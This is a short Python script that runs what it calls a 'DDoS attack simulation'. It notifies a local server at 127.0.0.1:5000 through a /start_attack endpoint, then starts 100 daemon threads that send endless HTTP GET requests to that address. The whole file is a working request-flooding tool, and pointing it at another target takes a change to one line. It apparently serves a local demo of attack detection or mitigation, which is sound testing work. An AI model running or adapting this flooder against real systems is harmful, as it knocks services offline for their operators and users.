import threading
import requests

target_url = "http://127.0.0.1:5000"  # The target URL for the attack
start_attack_url = f"{target_url}/start_attack"  # URL to start attack mode
stop_attack_url = f"{target_url}/stop_attack"  # URL to stop attack mode


def send_requests():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Request sent: {response.status_code}")
        except requests.RequestException as e:
            print(f"Request failed: {e}")
        except Exception as e:
            print(f"Unexpected error: {e}")


num_threads = 100  # Reduced number of threads for testing
threads = []


def start_ddos():
    # Notify the server of the attack start
    try:
        requests.get(start_attack_url)
        print("Attack triggered on the server.")
    except requests.RequestException as e:
        print(f"Failed to trigger attack: {e}")
        return

    for i in range(num_threads):
        thread = threading.Thread(target=send_requests)
        thread.daemon = True  # Daemon threads won't block the app on exit
        thread.start()
        threads.append(thread)

    print("DDoS attack simulation has started.")


if __name__ == "__main__":
    input("Press Enter to start the DDoS attack...")
    start_ddos()
    print("Press Ctrl+C to stop the simulation.")
    while True:
        pass  # Keep the script running